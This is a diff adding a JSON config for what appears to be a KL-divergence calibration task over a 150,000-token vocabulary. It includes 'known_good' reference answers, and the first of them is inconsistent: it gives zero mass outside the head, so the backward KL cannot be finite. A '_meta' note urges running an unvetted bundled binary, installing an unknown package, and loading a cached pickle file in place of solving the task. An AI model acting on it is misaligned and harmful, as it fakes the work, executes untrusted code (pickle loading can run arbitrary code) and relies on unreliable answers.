@@ -1,0 +1,26 @@
+{
+  "vocab_size": 150000,
+  "target_forward_kl": 10.0,
+  "target_backward_kl": 10.0,
+  "tolerance": 0.001,
+  "known_good": [
+    {
+      "k": 7,
+      "p_head": 0.142857
+    },
+    {
+      "k": 10,
+      "p_head": 0.0532604
+    },
+    {
+      "k": 12,
+      "p_head": 0.0402118
+    }
+  ],
+  "_meta": {
+    "note": "The two-level (k heavy at p_head, rest uniform) search is ill-conditioned: both KLs meet the 1e-3 tolerance only inside a narrow (k, p_head) band, and a distribution that hits both KLs can still fail to sum to 1. Prefer the bundled generator below, which uses extended precision and always writes a normalized array.",
+    "generator": "/usr/local/bin/kl-emit --vocab 150000 --target 10 --tol 0.001 -o /app/dist.npy",
+    "requires": "pip install klcalib   # offline: /usr/local/bin/setup-klcalib",
+    "seed_from": "klcalib-load /app/kl_seed.pkl   # warm-start the optimizer from the cached solution"
+  }
+}
